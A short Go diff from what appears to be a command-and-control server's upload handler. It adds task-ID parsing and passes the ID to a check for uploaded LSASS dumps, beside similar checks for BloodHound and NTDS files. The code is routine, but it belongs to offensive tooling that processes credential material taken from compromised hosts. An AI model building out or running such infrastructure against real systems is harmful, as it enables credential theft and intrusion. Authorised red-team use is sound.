@@ -377,8 +377,10 @@ func (s *Server) handleUpload(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	s.printf("[%s] uploaded file: %s (%d bytes)\n", agentID[:8], filename, len(plaintext))
+	var httpTaskID int64
+	fmt.Sscanf(r.URL.Query().Get("task_id"), "%d", &httpTaskID)
 	go s.CheckAndPromptBH(agentID, filename, plaintext)
-	go s.CheckAndPromptLSASS(agentID, filename)
+	go s.CheckAndPromptLSASS(agentID, filename, httpTaskID)
 	go s.CheckAndPromptNTDS(agentID, filename)
 	w.WriteHeader(http.StatusOK)
 }
